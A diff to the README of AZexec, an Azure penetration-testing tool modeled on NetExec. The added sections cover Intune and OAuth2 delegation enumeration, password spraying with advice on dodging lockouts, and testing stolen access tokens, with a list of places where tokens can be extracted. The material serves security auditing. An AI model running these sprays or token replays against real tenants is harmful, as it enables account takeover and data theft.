+    Windows Devices: 892
+    iOS/iPadOS Devices: 256
+    Android Devices: 78
+    macOS Devices: 8
+```
+
+**Security Analysis Features:**
+
+| Check | Risk Level | Description |
+|-------|------------|-------------|
+| High Enrollment Limits | MEDIUM | Device limits >10 may indicate weak controls |
+| No Security Requirements | HIGH | Compliance policies without security settings |
+| High Privilege Roles | HIGH | Roles with full Intune admin access |
+| Sensitive Config Profiles | INFO | VPN, WiFi, Certificate profiles (credential exposure risk) |
+| Local Admin Autopilot | MEDIUM | Autopilot profiles granting local admin rights |
+
+**Use Cases:**
+
+| Scenario | Description | Command |
+|----------|-------------|---------|
+| **Security Audit** | Review Intune configuration posture | `.\azx.ps1 intune-enum -ExportPath audit.html` |
+| **Penetration Testing** | Identify weak policies and high-priv roles | `.\azx.ps1 intune-enum` |
+| **Compliance Check** | Verify security requirements are enforced | `.\azx.ps1 intune-enum -ExportPath compliance.csv` |
+| **Attack Surface Analysis** | Identify sensitive configuration profiles | Review exported data for VPN/WiFi/Cert profiles |
+
+**Attack Context:**
+1. Enumerate Intune configuration to understand device management posture
+2. Identify compliance policies without security requirements (potential bypass)
+3. Find high-privilege role assignments (privilege escalation targets)
+4. Locate sensitive configuration profiles (credential harvesting opportunity)
+5. Analyze Autopilot profiles for local admin grants (initial access vector)
+
+**Troubleshooting**:
+- **"Failed to retrieve enrollment configurations"**: Ensure you have `DeviceManagementConfiguration.Read.All` permission.
+- **"Failed to retrieve role definitions"**: Ensure you have `DeviceManagementRBAC.Read.All` permission.
+- **"No managed device data available"**: Ensure you have `DeviceManagementManagedDevices.Read.All` permission or devices are enrolled in Intune.
+
+---
+
+### OAuth2 Delegation Enumeration: `delegation-enum`
+
+The Azure equivalent of NetExec's `--delegate` flag. Enumerate OAuth2 consent grants to identify applications that can act on behalf of users (impersonation paths).
+
+```powershell
+# Enumerate OAuth2 delegation (like nxc smb --delegate)
+.\azx.ps1 delegation-enum
+
+# Export results to file
+.\azx.ps1 delegation-enum -ExportPath delegation.csv
+.\azx.ps1 delegation-enum -ExportPath delegation.json
+.\azx.ps1 delegation-enum -ExportPath delegation.html
+```
+
+**What is Kerberos Delegation vs OAuth2 Delegation?**
+
+In on-premises Active Directory, Kerberos delegation allows services to impersonate users. In Azure/cloud environments, OAuth2 consent grants serve a similar purpose - allowing applications to act on behalf of users.
+
+**NetExec --delegate vs AZexec delegation-enum:**
+
+| Aspect | On-Premises (NetExec --delegate) | Azure (AZexec delegation-enum) |
+|--------|----------------------------------|--------------------------------|
+| **Command** | `nxc smb <target> -u User -p Pass --delegate` | `.\azx.ps1 delegation-enum` |
+| **Protocol** | Kerberos (port 88) / LDAP (port 389) | Microsoft Graph API (HTTPS/443) |
+| **Mechanism** | RBCD, Constrained/Unconstrained Delegation | OAuth2 Consent Grants |
+| **User Attribute** | `msDS-AllowedToActOnBehalfOfOtherIdentity` | `oauth2PermissionGrants.consentType` |
+| **Impersonation Scope** | Specific services/SPNs | Specific API scopes (Mail.Send, etc.) |
+| **Tenant-Wide** | Unconstrained Delegation | Admin Consent (`AllPrincipals`) |
+
+**Kerberos to OAuth2 Concept Mapping:**
+
+| Kerberos Delegation | OAuth2 Equivalent | Risk Level |
+|---------------------|-------------------|------------|
+| **RBCD** (Resource-Based Constrained Delegation) | Admin Consent (`AllPrincipals`) | HIGH - Tenant-wide impersonation |
+| **S4U2Self** (Service for User to Self) | Delegated permissions with user context | MEDIUM - Per-user impersonation |
+| **Constrained Delegation** | Specific scope grants (e.g., `Mail.Send`) | MEDIUM - Limited to specific APIs |
+| **Unconstrained Delegation** | `Directory.AccessAsUser.All` | CRITICAL - Full directory as any user |
+
+**What delegation-enum Detects:**
+
+| Permission | Risk Level | Description |
+|------------|------------|-------------|
+| `Directory.AccessAsUser.All` | CRITICAL | Full directory access as any user (unconstrained delegation equivalent) |
+| `RoleManagement.ReadWrite.Directory` | CRITICAL | Can assign any directory role including Global Admin |
+| `AppRoleAssignment.ReadWrite.All` | CRITICAL | Can grant any permission to any application |
+| `Application.ReadWrite.All` | CRITICAL | Can modify any application including adding credentials |
+| `Mail.Send` | HIGH | Send email as users (phishing, BEC) |
+| `Mail.ReadWrite` / `Mail.ReadWrite.All` | HIGH | Full mailbox access (data exfiltration) |
+| `Files.ReadWrite.All` | HIGH | Access all OneDrive/SharePoint files |
+| `Group.ReadWrite.All` | HIGH | Modify any group membership |
+
+**Key Risk Factor:** `consentType = "AllPrincipals"` = Admin consent = Acts on behalf of ALL users in tenant
+
+**Required Permissions:**
+
+```
+Application.Read.All  - Read service principals and consent grants
+Directory.Read.All    - Read directory data for permission resolution
+```
+
+**Example Output:**
+```
+[*] AZX - Azure OAuth2 Delegation Enumeration
+[*] Command: OAuth2 Permission Grant Analysis (Impersonation Paths)
+[*] Azure equivalent of NetExec's --delegate flag
+
+[*] ========================================
+[*] PHASE 3: Admin Consent Grants (Tenant-Wide Impersonation)
+[*] ========================================
+
+[!] Admin consent grants allow apps to act on behalf of ALL users in the tenant
+[!] This is the Azure equivalent of RBCD (Resource-Based Constrained Delegation)
+
+AZR         00000003-0000...    443    Mail-Integration-App               [!] AllPrincipals:Mail.Send,Mail.ReadWrite (CRITICAL)
+    [+] Mail.Send [HIGH]
+    [+] Mail.ReadWrite [HIGH]
+    [!] Can send/read email as ANY user in tenant
+    [+] Resource: Microsoft Graph
+    [+] Consent: Admin (tenant-wide impersonation)
+
+AZR         12345678-abcd...    443    Legacy-Portal                      [!] AllPrincipals:Directory.AccessAsUser.All (CRITICAL)
+    [+] Directory.AccessAsUser.All [CRITICAL]
+    [!] FULL DIRECTORY ACCESS as any user - Azure equivalent of unconstrained delegation
+    [+] Resource: Microsoft Graph
+    [+] Consent: Admin (tenant-wide impersonation)
+
+[*] ========================================
+[*] PHASE 4: User Consent Grants (Per-User Impersonation)
+[*] ========================================
+
+[*] User consent grants allow apps to act on behalf of specific users who consented
+
+AZR         87654321-dcba...    443    HR-App                             [*] Principal:User.Read (LOW)
+    [*] Per-user consent only (15 users)
+    [+] User.Read [LOW]
+
+[*] ========================================
+[*] DELEGATION SUMMARY
+[*] ========================================
+    [!] CRITICAL IMPERSONATION APPS: 2
+    [!] HIGH RISK IMPERSONATION APPS: 3
+    [*] MEDIUM RISK APPS: 8
+    [*] LOW RISK APPS: 22
+    [*] Total OAuth2 Grants: 34
+    [*] Admin Consent Grants: 5 (3 unique apps)
+    [*] User Consent Grants: 29
+```
+
+**Security Analysis Features:**
+
+| Check | Risk Level | Description |
+|-------|------------|-------------|
+| Directory.AccessAsUser.All | CRITICAL | Equivalent to unconstrained delegation |
+| Mail permissions with AllPrincipals | CRITICAL | Tenant-wide email impersonation |
+| RoleManagement.ReadWrite.Directory | CRITICAL | Can grant any role |
+| High-risk permissions with admin consent | HIGH | Elevated due to tenant-wide scope |
+| User consent grants | MEDIUM/LOW | Risk depends on number of consenting users |
+
+**Use Cases:**
+
+| Scenario | Description | Command |
+|----------|-------------|---------|
+| **Security Audit** | Review OAuth2 consent posture | `.\azx.ps1 delegation-enum -ExportPath audit.html` |
+| **Penetration Testing** | Identify impersonation paths | `.\azx.ps1 delegation-enum` |
+| **Compliance Check** | Verify consent grant policies | `.\azx.ps1 delegation-enum -ExportPath consent.csv` |
+| **Privilege Escalation** | Find apps that can escalate privileges | Review CRITICAL findings |
+
+**Attack Context:**
+1. Enumerate OAuth2 consent grants to identify impersonation opportunities
+2. Focus on admin consent grants (`AllPrincipals`) - these can impersonate ANY user
+3. Identify apps with `Directory.AccessAsUser.All` (unconstrained delegation equivalent)
+4. Look for apps with `Mail.Send` + admin consent (tenant-wide email spoofing)
+5. If an app with dangerous consent is compromised, attacker can impersonate users
+
+**Troubleshooting**:
+- **"Failed to retrieve service principals"**: Ensure you have `Application.Read.All` or `Directory.Read.All` permission.
+- **"Failed to retrieve OAuth2 permission grants"**: Ensure you have `Directory.Read.All` permission.
+- **Guest users may have limited access**: Guest accounts often cannot view consent grants due to restricted permissions.
+
+---
+
 ### Vulnerable Target Enumeration Examples (like nxc smb --gen-relay-list)
 
 ### Example 29: Basic Vulnerability Enumeration (Auto-Detect Domain)
@@ -4084,7 +5696,7 @@ Get-MgUser -All | Export-Csv loot/all-users.csv
 # - Exploitation of unpatched devices
 ```
 
-## 📊 Output Format
+## 📊 NetExec-Style Output Reference
 
 The tool provides netexec-style output with the following information:
 
@@ -4393,8 +6005,8 @@ AZR         <TenantName>                         443    [*] Password Policy Info
     [+] Password Validity Period:     90 days
     [+] Password Notification Window: 14 days
     [+] Verified Domains:             2 domain(s)
-        - contoso.com (Default)
-        - contoso.onmicrosoft.com (Initial)
+        - example.com (Default)
+        - example.onmicrosoft.com (Initial)
     [+] Technical Notification Emails: 1
         - admin@example.com
 
@@ -4782,7 +6394,7 @@ AZR         targetcorp.com                      443    [*] Vuln-List Results
 - `.json` - Full findings with all metadata
 - `.csv` - Spreadsheet-friendly format
 
-## 🔍 Interpreting Security Findings
+## 🔍 Security Risk Assessment Guide
 
 ### Tenant Discovery Security Assessment
 
@@ -5107,7 +6719,7 @@ Get-MgDevice -Top 10  # If this works, you're VERY vulnerable
 - [ ] Identify high-value targets (admins, executives)
 - [ ] Pivot to targeted phishing or credential attacks
 
-## 🔐 Authentication
+## 🔐 Authentication & Scope Requirements
 
 ### Username Enumeration (No Authentication Required)
 The `users` command uses the public GetCredentialType API endpoint and does not require authentication. This makes it perfect for:
@@ -5208,7 +6820,7 @@ Disconnect-MgGraph
 .\azx.ps1 hosts
 ```
 
-## 📁 Export Formats
+## 📁 Data Export (CSV/JSON/HTML)
 
 ### Username Enumeration Export
 
@@ -5332,7 +6944,7 @@ Includes: Domain, TenantConfig (NameSpaceType, FederationType, AcceptsExternalUs
 ```
 Includes: Username, Password, Success, MFARequired, ConsentRequired, ErrorCode, HasToken (one row per tested credential)
 
-## 📊 HTML Report Generation
+## 📊 Professional HTML Reports
 
 AZexec now supports **comprehensive HTML report generation** with a netexec-inspired dark theme. HTML reports provide a professional, shareable format perfect for documentation, presentations, and security assessments.
 
@@ -5534,7 +7146,7 @@ Generate multiple formats for different use cases:
 
 1. **Use Descriptive Filenames**: Include date, client name, and content type
    ```powershell
-   .\azx.ps1 roles -ExportPath "2025-01-15_ContosoCorp_PrivilegedRoles.html"
+   .\azx.ps1 roles -ExportPath "2025-01-15_ExampleCorp_PrivilegedRoles.html"
    ```
 
 2. **Generate Multiple Formats**: Keep CSV/JSON for data processing, HTML for reporting
@@ -5556,7 +7168,7 @@ Generate multiple formats for different use cases:
    Open .html → Press Ctrl+P → Destination: Save as PDF
    ```
 
-## 🛠️ Troubleshooting
+## 🛠️ Common Issues & Solutions
 
 ### Guest User Enumeration Issues
 
@@ -5826,7 +7438,7 @@ For full service principal discovery, you need:
 This project is licensed under the GNU General Public License v3.0 - see the [LICENSE](LICENSE) file for details.
 
 ```
-Copyright (C) 2025 Logisek
+Copyright (C) 2025-2026 Logisek
 https://github.com/Logisek/AZexec
 
 This program is free software: you can redistribute it and/or modify
@@ -6041,6 +7653,285 @@ nxc smb 192.168.1.0/24 -u users.txt -p 'Password123'  # Password spray
 # AZexec equivalent
 .\azx.ps1 users -Domain target.com -CommonUsernames -ExportPath users.csv
 .\azx.ps1 guest -Domain target.com -UserFile users.txt -Password 'Password123'
+```
+
+### Enhanced Password Spraying with NetExec-Style Options
+
+AZexec now includes a dedicated `spray` command with NetExec-style options for enhanced password spraying capabilities:
+
+#### New Parameters
+
+| Parameter | NetExec Equivalent | Description |
+|-----------|-------------------|-------------|
+| `-ContinueOnSuccess` | `--continue-on-success` | Don't stop after finding valid credentials |
+| `-NoBruteforce` | `--no-bruteforce` | Linear pairing (user1:pass1, user2:pass2) instead of matrix |
+| `-PasswordFile` | `-p @file.txt` | Load multiple passwords from file |
+| `-Delay` | N/A | Seconds between password rounds (lockout protection) |
+| `-LocalAuth` | `--local-auth` | Only spray managed (cloud-only) domains, skip federated |
+
+#### Usage Examples
+
+```powershell
+# Basic single password spray (same as guest command)
+.\azx.ps1 spray -Domain target.com -UserFile users.txt -Password 'Summer2024!'
+
+# Multi-password spray with 30-minute delay between rounds (OPSEC-safe)
+.\azx.ps1 spray -Domain target.com -UserFile users.txt -PasswordFile passwords.txt -Delay 1800
+
+# Continue spraying after finding valid credentials
+.\azx.ps1 spray -Domain target.com -UserFile users.txt -Password 'Pass123' -ContinueOnSuccess
+
+# Linear pairing mode (user1 with pass1, user2 with pass2, etc.)
+.\azx.ps1 spray -Domain target.com -UserFile users.txt -PasswordFile passwords.txt -NoBruteforce
+
+# Cloud-only spray - skip federated domains (Azure equivalent of --local-auth)
+.\azx.ps1 spray -Domain target.com -UserFile users.txt -Password 'Pass123' -LocalAuth
+
+# Full attack with HTML report
+.\azx.ps1 spray -Domain target.com -UserFile users.txt -PasswordFile passwords.txt -Delay 1800 -ContinueOnSuccess -ExportPath spray-report.html
+```
+
+#### NetExec Command Mapping
+
+| NetExec | AZexec |
+|---------|--------|
+| `nxc smb <target> -u users.txt -p 'Pass'` | `.\azx.ps1 spray -Domain target.com -UserFile users.txt -Password 'Pass'` |
+| `nxc smb <target> -u users.txt -p 'Pass' --continue-on-success` | `.\azx.ps1 spray ... -ContinueOnSuccess` |
+| `nxc smb <target> -u users.txt -p @pass.txt` | `.\azx.ps1 spray ... -PasswordFile pass.txt` |
+| `nxc smb <target> -u users.txt -p @pass.txt --no-bruteforce` | `.\azx.ps1 spray ... -PasswordFile pass.txt -NoBruteforce` |
+| `nxc smb <target> -u users.txt -p 'Pass' --local-auth` | `.\azx.ps1 spray ... -LocalAuth` |
+
+#### OPSEC Considerations
+
+The `spray` command displays OPSEC warnings before execution:
+
+```
+[!] ============================================
+[!] OPSEC WARNING - PASSWORD SPRAY ATTACK
+[!] ============================================
+
+[*] Attack Configuration:
+    Users to test:       50
+    Passwords to test:   3
+    Total attempts:      150
+    Attack mode:         Matrix (all combinations)
+    Delay between rounds: 1800 seconds
+    Continue on success: No
+
+[*] Azure AD Smart Lockout Information:
+    Default threshold:   ~10 failed attempts per user
+    Lockout duration:    60 seconds (increases with attempts)
+    Familiar locations:  May have higher threshold
+```
+
+**Recommended OPSEC Settings:**
+- Use `-Delay 1800` (30 minutes) or higher between password rounds
+- Spray only 1-2 passwords per day per user
+- Use `-NoBruteforce` when you have user:password pairs
+- Test against a small subset first to assess lockout policies
+
+#### Attack Modes
+
+**Matrix Mode (Default):**
+Tests all user/password combinations. With 50 users and 3 passwords = 150 attempts.
+
+```powershell
+.\azx.ps1 spray -Domain target.com -UserFile users.txt -PasswordFile passwords.txt
+```
+
+**Linear Pairing Mode (-NoBruteforce):**
+Tests user1 with pass1, user2 with pass2, etc. Useful when you have leaked credential pairs.
+
+```powershell
+.\azx.ps1 spray -Domain target.com -UserFile users.txt -PasswordFile passwords.txt -NoBruteforce
+```
+
+#### Output Formats
+
+The spray command supports multiple export formats:
+
+| Format | Command | Best For |
+|--------|---------|----------|
+| CSV | `-ExportPath results.csv` | Quick analysis, Excel |
+| JSON | `-ExportPath results.json` | Programmatic processing |
+| HTML | `-ExportPath report.html` | Reports, presentations |
+
+#### Local Authentication Mode (-LocalAuth)
+
+Use `-LocalAuth` to only spray managed (cloud-only) domains, skipping federated domains. This is the Azure equivalent of NetExec's `--local-auth` flag.
+
+```powershell
+# Cloud-only spray (skips federated domains)
+.\azx.ps1 spray -Domain target.com -UserFile users.txt -Password 'Pass123' -LocalAuth
+```
+
+**Why Use This?**
+
+Federated domains redirect ROPC authentication to on-premises identity providers (AD FS, Okta, Ping, etc.) which may:
+- Block ROPC entirely (AADSTS7000218)
+- Have different lockout policies
+- Log authentication attempts in the on-prem IdP
+- Require different attack vectors
+
+**Managed Domain with -LocalAuth:**
+```
+AZR         managed.com                        443    [*] Mode: Cloud-only auth (LocalAuth)
+AZR         managed.com                        443    [+] Tenant exists
+AZR         managed.com                        443    [*] NameSpaceType: Managed
+AZR         managed.com                        443    [*] Federation: Managed (Cloud-only)
+...
+AZR         managed.com                        443    user@managed.com                   [+] SUCCESS! (Cloud) Got access token
+```
+
+**Federated Domain with -LocalAuth:**
+```
+AZR         federated.com                      443    [!] SKIPPED - Federated domain (use without -LocalAuth to spray)
+[*] Domain uses federation: AD FS
+[*] Auth would redirect to: https://sts.company.com/adfs/ls/
+```
+
+**Technical Background:**
+
+Unlike SMB where `--local-auth` bypasses domain entirely, Azure has constraints:
+1. Cannot force cloud-only auth for federated domains - tenant policy controls this
+2. Federated domains redirect ROPC to federation provider
+3. Some federated setups block ROPC entirely
+
+The `-LocalAuth` flag checks the domain's `NameSpaceType` (Managed/Federated) and skips federated domains to avoid:
+- Wasted attempts against ROPC-blocked domains
+- Triggering alerts in on-premises IdPs
+- Unpredictable lockout behavior from external IdPs
+
+---
+
+## 🔐 Checking Credentials (Domain) - Azure's Pwn3d! Equivalent
+
+AZexec provides NetExec's "Checking Credentials (Domain)" functionality - testing credentials and showing privilege level (`Pwn3d!` equivalent) in a single operation.
+
+### NetExec Comparison
+
+**NetExec Commands:**
+```bash
+nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORD'     # Password auth
+nxc smb 192.168.1.0/24 -u UserName -H 'NTHASH'       # Hash auth (Pass-the-Hash)
+```
+
+**NetExec Output:**
+```
+SMB  192.168.1.100  445  DC01  [+] DOMAIN\admin:Password (Pwn3d!)
+SMB  192.168.1.101  445  SRV01 [+] DOMAIN\user:Password
+SMB  192.168.1.102  445  SRV02 [-] DOMAIN\user:Password
+```
+
+**AZexec Equivalent:**
+```powershell
+# Credential check with automatic admin detection
+.\azx.ps1 guest -Domain target.com -Username admin@target.com -Password 'Pass123'
+
+# Token-based auth (Azure's Pass-the-Hash equivalent)
+.\azx.ps1 guest -AccessToken "eyJ0eXAi..."
+```
+
+**AZexec Output:**
+```
+AZR         example.com                        443    admin@example.com              [+] SUCCESS! Got access token (GlobalAdmin!)
+AZR         example.com                        443    secops@example.com             [+] SUCCESS! Got access token (SecurityAdmin!)
+AZR         example.com                        443    user@example.com               [+] SUCCESS! Got access token
+AZR         example.com                        443    helpdesk@example.com           [+] Valid credentials - MFA REQUIRED
+AZR         example.com                        443    locked@example.com             [!] ACCOUNT LOCKED
+```
+
+### Automatic Admin Detection
+
+After successful authentication, AZexec **automatically** queries the user's role memberships and displays privilege indicators (NetExec's `Pwn3d!` equivalent):
+
+| Azure Role | Display Indicator | Risk Level |
+|------------|-------------------|------------|
+| Global Administrator | `(GlobalAdmin!)` | CRITICAL |
+| Privileged Role Administrator | `(PrivRoleAdmin!)` | CRITICAL |
+| Privileged Authentication Administrator | `(PrivAuthAdmin!)` | CRITICAL |
+| Security Administrator | `(SecurityAdmin!)` | HIGH |
+| Application Administrator | `(AppAdmin!)` | HIGH |
+| Authentication Administrator | `(AuthAdmin!)` | HIGH |
+| Cloud Application Administrator | `(CloudAppAdmin!)` | HIGH |
+| Conditional Access Administrator | `(CAAdmin!)` | HIGH |
+| Intune Administrator | `(IntuneAdmin!)` | HIGH |
+| User Administrator | `(UserAdmin!)` | MEDIUM |
+| Helpdesk Administrator | `(HelpdeskAdmin!)` | MEDIUM |
+| Password Administrator | `(PasswordAdmin!)` | MEDIUM |
+| Exchange Administrator | `(ExchangeAdmin!)` | MEDIUM |
+| SharePoint Administrator | `(SharePointAdmin!)` | MEDIUM |
+| Teams Administrator | `(TeamsAdmin!)` | MEDIUM |
+| Groups Administrator | `(GroupsAdmin!)` | MEDIUM |
+
+### Token-Based Authentication (Pass-the-Hash Equivalent)
+
+Azure AD doesn't use NTLM hashes, but OAuth2 access tokens serve as the equivalent "credential material" that can be stolen and replayed.
+
+**Why Token Auth Instead of Hash Auth?**
+- Azure AD doesn't use NTLM hashes for authentication
+- OAuth2 access tokens are the equivalent "credential material"
+- Token replay = Azure's Pass-the-Hash
+
+**Token Sources (where attackers extract tokens):**
+- Browser local storage / session storage
+- Process memory (Chrome, Edge, desktop apps)
+- Azure CLI token cache (`~/.azure/accessTokens.json`)
+- Azure PowerShell token cache
+- ADAL/MSAL token caches
+- Keychain (macOS) / Credential Manager (Windows)
+
+**Usage:**
+```powershell
+# Test with stolen/extracted access token
+.\azx.ps1 guest -AccessToken "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIs..."
+
+# Output shows username from token and privilege level
+# AZR  <tenant-id>  443  admin@example.com  [+] SUCCESS! Token validated (GlobalAdmin!)
+```
+
+### NetExec Command Mapping
+
+| NetExec | AZexec |
+|---------|--------|
+| `nxc smb <target> -u user -p 'pass'` | `.\azx.ps1 guest -Domain target.com -Username user@target.com -Password 'pass'` |
+| Shows `(Pwn3d!)` for admins | Automatic - shows `(GlobalAdmin!)`, `(SecurityAdmin!)`, etc. |
+| `nxc smb <target> -u user -H 'hash'` (Pass-the-Hash) | `.\azx.ps1 guest -AccessToken "eyJ0eXAi..."` |
+
+### Technical Implementation
+
+**Privilege Check Process:**
+1. After successful ROPC authentication, we get an access token
+2. Use the token to query `https://graph.microsoft.com/v1.0/me/transitiveMemberOf/microsoft.graph.directoryRole`
+3. Compare role template IDs against known privileged roles
+4. Display the highest-risk privilege indicator
+
+**Required Graph API Scope:**
+- `RoleManagement.Read.Directory` or `Directory.Read.All`
+- If the token lacks these scopes, privilege check is silently skipped
+
+**Rate Limiting Considerations:**
+- Automatic admin check adds 1-2 Graph API calls per successful auth
+- Only runs on SUCCESSFUL authentications (not failures)
+- Acceptable overhead even for large spray operations
+
+### Usage Examples
+
+```powershell
+# Single credential check with automatic admin detection
+.\azx.ps1 guest -Domain target.com -Username admin@target.com -Password 'Summer2024!'
+# Output: AZR example.com 443 admin@example.com [+] SUCCESS! Got access token (GlobalAdmin!)
+
+# Password spray - automatically detects admin on each valid credential
+.\azx.ps1 spray -Domain target.com -UserFile users.txt -Password 'Summer2024!'
+
+# Token-based auth - test a stolen access token
+.\azx.ps1 guest -AccessToken "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIs..."
+# Username extracted from token claims automatically
+
+# Export results with privilege data
+.\azx.ps1 spray -Domain target.com -UserFile users.txt -Password 'Pass' -ExportPath results.json
+# JSON includes: PrivilegeLevel, PrivilegeDisplay, PrivilegedRoles array
 ```
 
 ---
